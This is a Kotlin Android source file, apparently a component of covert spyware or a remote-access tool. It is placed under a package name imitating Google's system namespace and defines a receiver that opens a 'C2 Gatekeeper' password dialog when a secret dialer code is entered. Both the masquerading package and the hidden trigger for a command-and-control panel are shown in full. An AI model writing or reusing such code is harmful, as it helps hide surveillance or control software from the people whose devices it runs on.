package com.google.android.system

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * SecretCodeReceiver
 *
 * Catches secret dialer code *#*#1945#*#* and opens the C2 Gatekeeper password verification dialog.
 */
class SecretCodeReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null) return
        Log.i("SecretCodeReceiver", "Secret Code *#*#1945#*#* Dialed! Opening C2 Gatekeeper...")
        C2Gatekeeper.promptPasswordDialog(context) {}
    }
}
